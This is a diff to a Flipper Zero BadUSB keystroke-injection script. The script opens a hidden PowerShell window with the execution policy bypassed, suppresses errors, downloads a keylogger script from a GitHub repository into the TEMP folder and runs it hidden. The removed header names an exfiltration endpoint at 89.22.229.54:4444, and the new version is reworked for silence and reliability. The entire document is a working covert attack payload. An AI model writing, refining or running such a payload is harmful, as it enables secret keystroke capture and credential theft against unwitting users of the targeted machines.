@@ -1,12 +1,30 @@
-REM Flipper Zero BadUSB - load keylogger.ps1 from this repo, exfil TCP 89.22.229.54:4444
-REM Layout: US English. SD path: badusb/payload.txt (or any name under badusb/)
-REM Repo: https://github.com/naturalniyaboba2077/flipper-keylogger
+REM Flipper BadUSB - silent load keylogger from GitHub
+REM EN(US) layout required. Repo: naturalniyaboba2077/flipper-keylogger
+REM Short lines = no mid-string parse errors in PowerShell
 
-DELAY 2500
+DELAY 3000
 GUI r
-DELAY 600
+DELAY 800
 STRING powershell -NoP -NonI -W Hidden -Ep Bypass
 ENTER
-DELAY 1200
-STRING $u='https://raw.githubusercontent.com/naturalniyaboba2077/flipper-keylogger/main/keylogger.ps1'; $p=Join-Path $env:TEMP 'keylogger.ps1'; try{(New-Object Net.WebClient).DownloadFile($u,$p)}catch{Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing}; Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoP','-NonI','-W','Hidden','-Ep','Bypass','-File',$p; exit
+DELAY 1500
+STRING $ErrorActionPreference='SilentlyContinue'; $ProgressPreference='SilentlyContinue'
+ENTER
+DELAY 200
+STRING try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
+ENTER
+DELAY 200
+STRING $u='https://raw.githubusercontent.com/naturalniyaboba2077/flipper-keylogger/main/keylogger.ps1'
+ENTER
+DELAY 200
+STRING $p=$env:TEMP+'\k.ps1'
+ENTER
+DELAY 200
+STRING try{(New-Object Net.WebClient).DownloadFile($u,$p)}catch{try{Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing}catch{}}
+ENTER
+DELAY 2500
+STRING if(Test-Path $p){Start-Process -FilePath powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -NonI -W Hidden -Ep Bypass -File $p"}
+ENTER
+DELAY 500
+STRING exit
 ENTER
